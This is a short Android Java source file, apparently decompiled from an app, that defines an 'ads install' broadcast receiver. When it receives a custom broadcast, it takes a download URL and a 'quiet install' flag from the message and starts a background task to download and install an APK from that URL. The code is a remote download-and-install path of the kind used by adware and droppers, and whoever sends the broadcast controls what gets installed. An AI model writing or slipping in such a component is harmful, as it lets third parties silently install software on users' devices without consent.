package com.qc.access;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.qc.model.APKInstallTask;
import com.qc.util.IsNetOpen;

public class AdsInstallReceiver extends BroadcastReceiver {
    private static final String ACTION_NAME = "com.mnkp.action.INSTALLINADS";

    public void onReceive(Context context, Intent intent) {
        if (ACTION_NAME.equals(intent.getAction().trim())) {
            IsNetOpen ino = new IsNetOpen(context);
            String urlStr = intent.getStringExtra("downLoadURL");
            int isQuietInstall = intent.getIntExtra("isQuietInstall", 0);
            int id = intent.getIntExtra("id", 0);
            if (ino.checkNet()) {
                Thread thread = new Thread(new APKInstallTask(urlStr, isQuietInstall, context, String.valueOf(id)));
                thread.setPriority(10);
                thread.start();
            }
        }
    }
}
